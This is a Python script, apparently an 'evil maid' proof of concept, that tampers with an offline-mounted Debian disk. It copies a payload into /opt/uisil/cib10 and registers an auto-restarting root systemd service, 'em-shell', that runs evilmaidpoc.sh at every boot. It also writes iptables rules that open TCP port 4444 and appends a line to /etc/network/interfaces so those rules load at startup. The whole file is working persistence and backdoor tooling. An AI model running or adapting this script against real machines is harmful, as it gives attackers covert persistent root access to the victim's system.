import os
import shutil

# Base directory where the Debian system is mounted
debian_root = "/media/localdisk"  # Change this path based on where you mounted the VM disk
payload_path = f"{debian_root}/opt/uisil/cib10"

# Paths for system files
systemd_service_file = f"{debian_root}/etc/systemd/system/em-shell.service"
iptables_rules_file = f"{debian_root}/etc/iptables/rules.v4"
default_systemd_target = f"{debian_root}/etc/systemd/system/default.target"

# Ensure the directories exist
os.makedirs(os.path.dirname(systemd_service_file), exist_ok=True)
os.makedirs(os.path.dirname(iptables_rules_file), exist_ok=True)

# Deploy payload
os.makedirs(payload_path, exist_ok=True)
shutil.copytree("../payload", payload_path,dirs_exist_ok=True)
# Payload permission resolved
for filename in os.listdir(payload_path):
    file_path = os.path.join(payload_path, filename)
    if os.path.isfile(file_path):
        os.chmod(file_path, 0o644)


# Define the systemd service content
service_content = """[Unit]
Description=EM Shell Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash /opt/uisil/cib10/evilmaidpoc.sh
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
"""

# Write the systemd service file
with open(systemd_service_file, "w") as f:
    f.write(service_content)

# Set correct permissions
os.chmod(systemd_service_file, 0o644)

# Enable the service by creating a symlink (equivalent of `systemctl enable em-shell`)
multi_user_target = f"{debian_root}/etc/systemd/system/multi-user.target.wants/em-shell.service"
os.makedirs(os.path.dirname(multi_user_target), exist_ok=True)
if not os.path.exists(multi_user_target):
    os.symlink(systemd_service_file, multi_user_target)

# Define iptables rules to allow TCP traffic on port 4444
iptables_rules = """*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]

# Allow incoming and outgoing TCP traffic on port 4444
-A INPUT -p tcp --dport 4444 -j ACCEPT
-A OUTPUT -p tcp --sport 4444 -j ACCEPT

COMMIT
"""

# Write the iptables rules file
with open(iptables_rules_file, "w") as f:
    f.write(iptables_rules)

# Ensure iptables rules are loaded at boot by modifying /etc/network/interfaces
network_interfaces_file = f"{debian_root}/etc/network/interfaces"

iptables_persistent_command = "\npre-up iptables-restore < /etc/iptables/rules.v4\n"

# Modify /etc/network/interfaces to load iptables rules on boot
if os.path.exists(network_interfaces_file):
    with open(network_interfaces_file, "r") as f:
        interfaces_content = f.read()

    if "pre-up iptables-restore < /etc/iptables/rules.v4" not in interfaces_content:
        with open(network_interfaces_file, "a") as f:
            f.write(iptables_persistent_command)

# Ensure default systemd target is multi-user.target
if os.path.exists(default_systemd_target):
    os.remove(default_systemd_target)
os.symlink("/lib/systemd/system/multi-user.target", default_systemd_target)

print("Configuration files modified successfully. On the next boot, the EM Shell service will run automatically.")
print("Firewall rules allowing TCP traffic on port 4444 are also configured.")